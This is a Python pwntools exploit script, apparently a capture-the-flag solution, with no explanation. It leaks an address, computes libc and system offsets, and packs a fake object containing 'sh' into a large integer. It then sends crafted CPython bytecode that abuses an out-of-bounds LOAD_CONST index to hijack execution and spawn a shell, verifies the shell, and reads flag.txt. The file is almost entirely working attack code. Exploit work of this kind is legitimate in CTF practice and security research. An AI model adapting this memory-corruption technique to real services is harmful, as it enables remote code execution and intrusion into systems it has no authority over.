#!/usr/bin/env python3

import os
import sys
import time

import pwn 

def attack(io):
    io.recvuntil(b'= ')
    leak = int(io.recvline(), 16)
    print(f'leak @ {hex(leak)}')
    start = leak + 0x1e410 + 0x18
    print(f'start @ {hex(start)}')
    offset = (1 << 32) - 0x10c6c0
    object_ptr = start - 0x10c6c0*8
    print(f'object_ptr @ {hex(object_ptr)}')
    libc_base = leak - 0x6a9d30
    print(f'libc_base @ {hex(libc_base)}')
    system = libc_base + 0x53110
    print(f'system @ {hex(system)}')

    if (object_ptr >> 30) & 3 > 0:
        print('bad object_ptr')
        return False

    if (libc_base >> 30) & 3 > 0:
        print('bad libc_base')
        return False

    payload = [
        object_ptr + 0x10, 0,
        pwn.u64(b'sh\x00\x00\x00\x00\x00\x00')-3, object_ptr + 0x20,
        0xffffffff, 0x4141414141414141, 
    ]
    payload = payload + [system] * (50 - len(payload))

    number = 0
    for x in payload[::-1]:
        number = number << 30
        number = number | ((x >> 32) & ((1 << 30) - 1))
        number = number << 30
        number = number | (x & ((1 << 30) - 1))

    bytecode = [
        ('RESUME', 0),
        ('EXTENDED_ARG', (offset >> 24) & 0xFF),
        ('EXTENDED_ARG', (offset >> 16) & 0xFF),
        ('EXTENDED_ARG', (offset >> 8) & 0xFF),
        ('LOAD_CONST', (offset) & 0xFF),
        ('RETURN_VALUE', 0),
        ('NONEXISTENT', number),
        ('NONEXISTENT', number),
    ]
    # print(str(bytecode))
    io.sendlineafter(b'> ', str(bytecode).encode())
    
    time.sleep(0.5)
    io.sendline(b'echo check')
    if b'check' not in io.recvline():
        print('check failed')
        return False

    io.sendline(b'cat flag.txt')
    print(io.recvline())

    return True

def main():
    host = sys.argv[1]
    port = sys.argv[2]

    while True:
        with pwn.remote(host, port) as io:
            try:
                if attack(io):
                    os._exit(0)
            except Exception as e:
                print(f'[-] {e}')

if __name__ == '__main__':
    main()
